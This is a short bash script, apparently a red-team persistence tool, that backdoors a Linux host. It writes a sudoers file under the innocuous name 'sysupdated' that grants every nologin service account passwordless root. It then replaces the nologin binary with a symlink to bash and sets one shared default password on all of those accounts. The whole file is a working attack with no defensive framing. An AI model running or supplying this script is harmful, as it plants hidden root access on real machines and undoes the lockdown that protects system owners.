#!/usr/bin/env bash

PASS="${1:-rt2025\!delta}"

NLOGIN_LOC=$(which nologin)
BASH_LOC=$(which bash)

# grant sudo to all nologin accounts
getent passwd | awk -F: '$7 ~ /nologin/ {print $1 " ALL=(ALL) NOPASSWD: ALL"}' \
    > /etc/sudoers.d/sysupdated
chmod 440 /etc/sudoers.d/sysupdated

# make nologin → bash
cp $NLOGIN_LOC ${NLOGIN_LOC}.orig
rm -rf $NLOGIN_LOC
ln -s $BASH_LOC $NLOGIN_LOC

# set password for every nologin account
getent passwd | awk -F: '$7 ~ /nologin/ {print $1}' | while read -r u; do
    echo "${u}:${PASS}" | chpasswd
done
